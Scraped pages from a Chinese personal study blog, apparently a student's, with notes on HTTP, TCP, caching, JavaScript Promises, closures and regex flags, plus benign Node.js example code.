<p>首先明确二者没有区别！两个IP地址的角度不一样，127.0.0.1是从IETF（因特尔工程任务组）规定看，是留给本机使用的IP地址，所有的计算机默认都是相同的。而192.168.0.1其实只是IETF在c类网址中，专门留出给专用网络用的一个网段中的IP而已，该网段包含了192.168.0.1到192.168.255.255中所有的IP地址。</p>
</blockquote>
<h3 id="3-从输入URL到页面加载发生了什么【必考】"><a href="#3-从输入URL到页面加载发生了什么【必考】" class="headerlink" title="3.从输入URL到页面加载发生了什么【必考】"></a>3.从输入URL到页面加载发生了什么【必考】</h3><blockquote>
<p>总体来说分为以下几个过程：  </p>
<ul>
<li>DNS解析</li>
<li>TCP连接</li>
<li>发送HTTP请求</li>
<li>服务器处理请求并返回HTTP报文</li>
<li>浏览器解析渲染页面</li>
<li>连接结束   </li>
</ul>
</blockquote>
<h3 id="4-Socket连接与HTTP连接的联系与区别（需了解）"><a href="#4-Socket连接与HTTP连接的联系与区别（需了解）" class="headerlink" title="4.Socket连接与HTTP连接的联系与区别（需了解）"></a>4.Socket连接与HTTP连接的联系与区别（需了解）</h3><blockquote>
<p>由于通常情况下Socket连接就是TCP连接，因此Socket连接一旦建立，通信双方即可开始相互发送数据内容，直到双方连接断开。但在实际网络应用中，客户端到服务器之间的通信往往需要穿越多个中间节点，例如路由器、网关、防火墙等，大部分防火墙默认会关闭长时间处于非活跃状态的连接而导致Socket连接断连，因此需要通过轮询告诉网络，该连接处于活跃状态。<br>而HTTP连接使用的是“请求-响应”的方式，不仅在请求时需要先建立连接，而且需要客户端向服务器发出请求后，服务端才能回复数据。<br>很多情况下，需要服务器端主动向客户端推送数据，保持客户端与服务器数据的实时与同步。此时若双发建立的是Socket连接，服务器就可以直接将数据传送给客户端；若双发建立的是HTTP连接，则服务器需要等到客户端发送一次请求后才能将数据传回给客户端，因此，客户端定时向服务器发送连接请求，不仅可以保持在线，同时也是在“询问”服务器是否有新的数据，如果有就将数据传给客户端。</p>
</blockquote>
<h3 id="5-HTTP-TCP-报文结构-必考"><a href="#5-HTTP-TCP-报文结构-必考" class="headerlink" title="5.HTTP(TCP)报文结构(必考)"></a>5.HTTP(TCP)报文结构(必考)</h3><blockquote>
<p>例如一个100kb的HTML文档需要传送到另外一台计算机，并不会整个文档直接传送过去，可能会切割成几个部分，比如四个分别为25kb的数据段。而每个数据再加上一个TCP首部，就组成了TCP报文。TCP报文包括首部和数据部分。<br>|  TCP首部 |  TCP数据部分  |<br>首部：  </p>
<ul>
<li>源端口 source port</li>
<li>目的端口 destinnation port</li>
<li>序号 sequence number</li>
<li>确认号 acknowledgement number</li>
<li>数据偏移 offset</li>
<li>保留 reserved</li>
<li>标志位 tcp flags</li>
<li>窗口大小 window size</li>
<li>检验和 checksum</li>
<li>紧急指针 urgent pointer</li>
<li>选项 tcp options</li>
</ul>
</blockquote>
<h3 id="6-HTTP缓存机制-常考"><a href="#6-HTTP缓存机制-常考" class="headerlink" title="6.HTTP缓存机制(常考)"></a>6.HTTP缓存机制(常考)</h3><blockquote>
<p>HTTP的缓存主要利用header里的两个字段来控制：</p>
<ul>
<li><code>Cache-control</code>主要包含以下几个字段：<br>1.private：则只有客户端可以缓存<br>2.public：客户端和代理服务器都可以缓存<br>3.max-age：缓存的过期时间<br>4.no-cache：需要使用对比缓存来验证缓存数据<br>5.no-store：所有内存都不会进行缓存</li>
<li><code>ETag</code>:即用来进行对比缓存，ETag是服务端资源的一个标识码  </li>
</ul>
</blockquote>
<p>  -当客户端发送第一次请求时服务端会下发当前请求资源的标识码Etag，下次再请求时，客户端则会通过header里面的If-None-Match将这个Etag带上，服务端将客户端传来的Etag与最新资源的Etag对比，如果一样，则表示资源没有更新，返回304。  </p>
<p>通过Cache-control 和 Etag 的配合来实现HTTP的缓存机制。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/02/11-2/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/02/11-2/" itemprop="url">11.2</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-02T20:08:02+08:00">
                2018-11-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h5 id="前言：回家了4天，啥都没有干，就是学了科目三，做好了晚上复习复变的计划被练车身体太累给取消了。。幸好科目三过了（下周可以拿证了！可以在大学城飙车了，无奈老爸不给我把家里的车开过来哈哈哈，只能开共享汽车了）好了，不多说了，最近看的东西有点杂，不过也是在复习之前学过的东西，方便自己加深记忆。"><a href="#前言：回家了4天，啥都没有干，就是学了科目三，做好了晚上复习复变的计划被练车身体太累给取消了。。幸好科目三过了（下周可以拿证了！可以在大学城飙车了，无奈老爸不给我把家里的车开过来哈哈哈，只能开共享汽车了）好了，不多说了，最近看的东西有点杂，不过也是在复习之前学过的东西，方便自己加深记忆。" class="headerlink" title="前言：回家了4天，啥都没有干，就是学了科目三，做好了晚上复习复变的计划被练车身体太累给取消了。。幸好科目三过了（下周可以拿证了！可以在大学城飙车了，无奈老爸不给我把家里的车开过来哈哈哈，只能开共享汽车了）好了，不多说了，最近看的东西有点杂，不过也是在复习之前学过的东西，方便自己加深记忆。"></a>前言：回家了4天，啥都没有干，就是学了科目三，做好了晚上复习复变的计划被练车身体太累给取消了。。幸好科目三过了（下周可以拿证了！可以在大学城飙车了，无奈老爸不给我把家里的车开过来哈哈哈，只能开共享汽车了）好了，不多说了，最近看的东西有点杂，不过也是在复习之前学过的东西，方便自己加深记忆。</h5><h4 id="1-HTTP（熟悉到再也不能熟悉了，之前暑假看过书，看过视频了）"><a href="#1-HTTP（熟悉到再也不能熟悉了，之前暑假看过书，看过视频了）" class="headerlink" title="1.HTTP（熟悉到再也不能熟悉了，之前暑假看过书，看过视频了）"></a>1.HTTP（熟悉到再也不能熟悉了，之前暑假看过书，看过视频了）</h4><blockquote>
<p>HTTP是基于TCP/IP协议通信协议来传递数据（HTML文件、图片文件、查询结果等），但它不涉及数据包（packet）传输，主要规定了客户端和服务器之间的通信格式，默认80端口。<br>HTTP请求方法有GET、HEAD、PUT、DELETE、POST，每种方法规定了客户与服务器联系的类型不同。(一般也是用get和post)<br>HTTP协议是无状态的，HTTP协议自身不对请求和响应之间的通信状态进行保存。任何两次请求之间都没有依赖关系。这样的目的是为了更快地处理大量事务，确保协议的可伸缩性。<br>Http报文包括请求报文和响应报文两大部分，其中请求报文由请求行（request line）、请求头（header）、空行和请求体四个部分组成。而响应报文由状态行、响应头部、空行和响应体四个部分组成。<br>==空行==：最后一个请求头之后是一个空行，这个行非常重要，它表示请求头已经结束，接下来的是请求正文。  </p>
</blockquote>
<p>终于搞懂了GET和POST的区别了：</p>
<ul>
<li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li>
<li>GET请求会被浏览器主动缓存，而POST不会，除非手动设置。</li>
<li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li>
<li>GET请求在URL中传送的参数是有长度限制的，而POST没有限制。</li>
<li>GET参数通过URL传递，POST放在Request body中。  </li>
</ul>
<blockquote>
<p>持久连接的特点（keep-alive）：主要任意一端没有明确提出断开连接，则保持TCP连接状态。持久连接的好处在于减少了TCP连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。另外， 减少开销的那部分时间，使HTTP请求和响应能够更早地结束，这样Web页面的显示速度也就相应提高了。<br>管线化：持久连接使得多数请求以管线化方式发送成为可能，这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。通俗地讲，请求打包一次传输过去，响应打包一次传递回来。管线化的前提是在持久连接下。管道机制则是允许浏览器同时发出这十个请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。  </p>
</blockquote>
<p>持久连接：请求1 -&gt; 响应1 -&gt; 请求2 -&gt; 响应2 -&gt; 请求3 -&gt; 响应3<br>管线化方式：请求1 -&gt; 请求2 -&gt; 请求3 -&gt; 响应1 -&gt; 响应2 -&gt; 响应3<br><img src="../img/http.jpg" alt="HTTP"><br>找了一张图，果断上！</p>
<h4 id="2-Promise（emmm，博客是有比较多的Promise-的了，只不过有时候看到其他介绍Promise而博客没有的我就记录一下而已）"><a href="#2-Promise（emmm，博客是有比较多的Promise-的了，只不过有时候看到其他介绍Promise而博客没有的我就记录一下而已）" class="headerlink" title="2.Promise（emmm，博客是有比较多的Promise 的了，只不过有时候看到其他介绍Promise而博客没有的我就记录一下而已）"></a>2.Promise（emmm，博客是有比较多的Promise 的了，只不过有时候看到其他介绍Promise而博客没有的我就记录一下而已）</h4><blockquote>
<p>回调：来看一些情况：  </p>
<ol>
<li>回调函数执行多次</li>
<li>回调函数没有执行</li>
<li>回调函数有时同步执行有时异步执行  </li>
</ol>
</blockquote>
<p>对于这些情况，就可能要在回调函数中做些处理，且每次执行回调函数的时候就要做这些处理，这就有很多重复的代码。  </p>
<h5 id="不开玩笑，下面这些内容我看了一天（还是没怎么看懂）"><a href="#不开玩笑，下面这些内容我看了一天（还是没怎么看懂）" class="headerlink" title="不开玩笑，下面这些内容我看了一天（还是没怎么看懂）"></a>不开玩笑，下面这些内容我看了一天（还是没怎么看懂）</h5><p>==回调地狱==：<br>现在要找出一个目录中最大的文件，处理步骤应该是： </p>
<ol>
<li>用 <code>fs.readdir</code> 获取目录中的文件列表</li>
<li>循环遍历文件，使用 <code>fs.stat</code> 获取文件信息</li>
<li>比较找出最大文件；</li>
<li>以最大文件的文件名为参数调用回调。  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findLargest</span>(<span class="params">dir, cb</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 读取目录下的所有文件</span></span><br><span class="line">  fs.readdir(dir, <span class="function"><span class="keyword">function</span>(<span class="params">er,files</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(er) <span class="keyword">return</span> cb(er);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> counter = files.length;</span><br><span class="line">    <span class="keyword">var</span> errored = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> stats = [];</span><br><span class="line"></span><br><span class="line">    files.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">file, index</span>)</span>&#123;</span><br><span class="line">      <span class="comment">//读取文件信息</span></span><br><span class="line">      fs.stat(path.join(dir,file), <span class="function"><span class="keyword">function</span>(<span class="params">er,stat</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(errored) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(er) &#123;</span><br><span class="line">          errored = <span class="literal">true</span>;</span><br><span class="line">          <span class="keyword">return</span> cb(er);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stats[index] = stat;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 事先算好有多少个文件，读完1个文件信息，计数减1，当为0时，说明读取完毕，此时执行最终的比较操作</span></span><br><span class="line">        <span class="keyword">if</span>(--counter == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">var</span> largest = stats</span><br><span class="line">              .filter(<span class="function"><span class="keyword">function</span>(<span class="params">stat</span>) </span>&#123; <span class="keyword">return</span> stat.isFile() &#125;)</span><br><span class="line">              .reduce(<span class="function"><span class="keyword">function</span>(<span class="params">prev, next</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (prev.size &gt; next.size) <span class="keyword">return</span> prev </span><br><span class="line">                <span class="keyword">return</span> next</span><br><span class="line">              &#125;)</span><br><span class="line">            cb(<span class="literal">null</span>, files[stats.indexOf(largest)])</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">findLargest(<span class="string">'./'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">er,filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(er) <span class="keyword">return</span> <span class="built_in">console</span>.error(er)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'largest file was:'</span>, filename)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise写法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> readDir = <span class="function"><span class="keyword">function</span>(<span class="params">dir</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    fs.readdir(dir, <span class="function"><span class="keyword">function</span>(<span class="params">err, files</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err) reject(err);</span><br><span class="line">      resolve(files);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stat = <span class="function"><span class="keyword">function</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    fs.stat(path, <span class="function"><span class="keyword">function</span>(<span class="params">err, stat</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err) reject(err);</span><br><span class="line">      resolve(stat);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findLargest</span>(<span class="params">dir</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> readDir(dir)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">files</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> promises = files.map(<span class="function"><span class="params">file</span> =&gt;</span> stat(path.join(dir, file)))</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.all(promise).then(<span class="function"><span class="keyword">function</span>(<span class="params">stats</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; stats, files&#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> largest = data.stats</span><br><span class="line">          .filter(<span class="function"><span class="keyword">function</span>(<span class="params">stat</span>) </span>&#123; <span class="keyword">return</span> stat.isFile() &#125;)</span><br><span class="line">          .reduce(<span class="function">(<span class="params">prev, next</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.size &gt; next.size) <span class="keyword">return</span> prev;</span><br><span class="line">            <span class="keyword">return</span> next;</span><br><span class="line">          &#125;)</span><br><span class="line">      <span class="keyword">return</span> data.files[data.stats.indexOf(largest)]</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="嵌套和缩进只是回调地狱的一个梗而已，它导致的问题远非嵌套导致的可读性降低而已。-但是Promise使得上述问题都得到解决。"><a href="#嵌套和缩进只是回调地狱的一个梗而已，它导致的问题远非嵌套导致的可读性降低而已。-但是Promise使得上述问题都得到解决。" class="headerlink" title="嵌套和缩进只是回调地狱的一个梗而已，它导致的问题远非嵌套导致的可读性降低而已。,但是Promise使得上述问题都得到解决。"></a>嵌套和缩进只是回调地狱的一个梗而已，它导致的问题远非嵌套导致的可读性降低而已。,但是<code>Promise</code>使得上述问题都得到解决。</h4><p>来个红绿灯问题：红灯三秒亮一次，绿灯一秒亮一次，黄灯2秒亮一次；如何让三个灯不断交替重复亮灯？（用 Promse 实现）：  </p>
<pre><code class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">red</span>(<span class="params"></span>) </span>{
  <span class="built_in">console</span>.log(<span class="string">'red'</span>);
}

<span class="function"><span class="keyword">function</span> <span class="title">green</span>(<span class="params"></span>) </span>{
  <span class="built_in">console</span>.log(<span class="string">'green'</span>);
}

<span class="function"><span class="keyword">function</span> <span class="title">yellow</span>(<span class="params"></span>)</span>{
  <span class="built_in">console</span>.log(<span class="string">'yellow'</span>);
}

<span class="keyword">var</span> light = <span class="function"><span class="keyword">function</span>(<span class="params">timer, cb</span>) </span>{
  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>{
    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{
      cb();
      resolve();
    }, timer);
  });
};

<span class="keyword">var</span> step = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{
  <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{
    <span class="keyword">return</span> light(<span class="number">3000</span>, red);
  }).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{
    <span class="keyword">return</span> light(<span class="number">2000</span>, green);
  }).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{
    <span class="keyword">return</span> light(<span class="number">1000</span>, yellow);
  }).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{
    step();
  });
}

step();
</code></pre>
<h5 id="还有很多知识点我就不搬过来了，希望自己能够记得吧。。（难）"><a href="#还有很多知识点我就不搬过来了，希望自己能够记得吧。。（难）" class="headerlink" title="还有很多知识点我就不搬过来了，希望自己能够记得吧。。（难）"></a>还有很多知识点我就不搬过来了，希望自己能够记得吧。。（难）</h5>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/杂文/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/23/杂文/" itemprop="url">杂文</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-23T15:33:06+08:00">
                2018-10-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h5 id="最近好没有状态，心事有、多，总感觉自己学的东西，过一段时间就会忘掉了，有时候想用，要看一下之前写过什么才知道怎么下手。。。所以没怎么碰代码。。。好了，废话不多bb，写点东西了。"><a href="#最近好没有状态，心事有、多，总感觉自己学的东西，过一段时间就会忘掉了，有时候想用，要看一下之前写过什么才知道怎么下手。。。所以没怎么碰代码。。。好了，废话不多bb，写点东西了。" class="headerlink" title="最近好没有状态，心事有、多，总感觉自己学的东西，过一段时间就会忘掉了，有时候想用，要看一下之前写过什么才知道怎么下手。。。所以没怎么碰代码。。。好了，废话不多bb，写点东西了。"></a>最近好没有状态，心事有、多，总感觉自己学的东西，过一段时间就会忘掉了，有时候想用，要看一下之前写过什么才知道怎么下手。。。所以没怎么碰代码。。。好了，废话不多bb，写点东西了。</h5><h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><h4 id="其实闭包之前在看文章看过，当时理解不深透，这几天在看其他资料，总算知道点东西了："><a href="#其实闭包之前在看文章看过，当时理解不深透，这几天在看其他资料，总算知道点东西了：" class="headerlink" title="其实闭包之前在看文章看过，当时理解不深透，这几天在看其他资料，总算知道点东西了："></a>其实闭包之前在看文章看过，当时理解不深透，这几天在看其他资料，总算知道点东西了：</h4><blockquote>
<p>函数执行，形成一个私有作用域，保护里面的私有变量不受外界的干扰，这种保护机制叫做<strong>闭包</strong>(也称包庇？)有、东西</p>
<p>但是现在市面上，99%的IT开发者都认为:函数执行，形成一个不销毁的私有作用域，除了保护私有变量以外，还可以存储一些内容，这样的模式才是闭包。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> jQuery = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;;</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">window</span>.jQuery = <span class="built_in">window</span>.$ = jQuery;</span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br><span class="line"></span><br><span class="line">jQuery();</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>比如上述的jQ源码，就是一个闭包。<br>闭包作用：<br>1、保护<br>团队协作开发，每个开发者把自己的代码存放到一个私有的作用域中，防止互相之间的冲突；把需要供别人使用的方法，通过return或者window.xxx暴露在全局下即可，例如：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">var</span> c = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> b = <span class="number">10</span>;</span><br><span class="line">     alert(b);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> a;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">c();  <span class="comment">//10;</span></span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">&gt;或者：</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">   (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> b = <span class="number">10</span>;</span><br><span class="line">     alert(b);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">window</span>.a = a;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">a(); <span class="comment">//10;</span></span><br><span class="line"><span class="string">``</span><span class="string">`    </span></span><br><span class="line"><span class="string">2、保存作用  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#### 正则</span></span><br><span class="line"><span class="string">##### 我个人认为正则是有、意思的，有时候都看不懂。。。？？？  </span></span><br><span class="line"><span class="string">&gt;先上几个基础的东西吧：  </span></span><br><span class="line"><span class="string">1. `</span>i<span class="string">` 不区分大小写：/abc/i 可以匹配abc，aBC,Abc  </span></span><br><span class="line"><span class="string">2. `</span>g<span class="string">` 全局匹配：如果不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功，返回；如果带g，则字符串从左到右，找到每个符合条件的都记录下来，知道字符串结尾位置  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'aaaa'</span>;</span><br><span class="line"><span class="keyword">var</span> reg1 = <span class="regexp">/a/</span>; str.match(reg1); <span class="comment">// ["a", index:0, input:"aaaa"]</span></span><br><span class="line"><span class="keyword">var</span> reg2 = <span class="regexp">/a/g</span>; str.match(reg2) <span class="comment">// ["a","a","a","a"]</span></span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">3.`</span>m<span class="string">` 多行匹配：若存在换行\n并且有开始^或结束$符的情况下，和g一起使用实现全局匹配；g只匹配第一行，添加m之后实现多行，每个换行符之后就是开始  </span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">"abcggab\nabcoab"</span>;</span><br><span class="line"><span class="keyword">var</span> preg1 = <span class="regexp">/^abc/gm</span>;  str.match(preg1); <span class="comment">// ["abc","abc"]  </span></span><br><span class="line"><span class="keyword">var</span> preg2 = <span class="regexp">/ab$/gm</span>;  str.match(preg2); <span class="comment">// ["ab", "ab"]</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>4.<code>s</code> 特殊字符圆点<code>.</code>中包含换行符：默认的圆点<code>.</code>是匹配除换行符\n之外的任何单字符，加上s之后，<code>.</code>中包含换行符  </p>
<blockquote>
<p>来些劲抽野：<code>u</code>嘻嘻嘻，没听过吧，这是在es6里面的。。这个是用来处理四个字符的UTF-16编码，就是大于<code>\uFFFF</code>的Unicode字符。</p>
<pre><code class="javascript">/^\uD83D/u.test(<span class="string">'\uD83D\uDC2A'</span>) <span class="comment">// false</span>
/^\uD83D/.test(<span class="string">'\uD83D\uDC2A'</span>) <span class="comment">// true</span>
</code></pre>
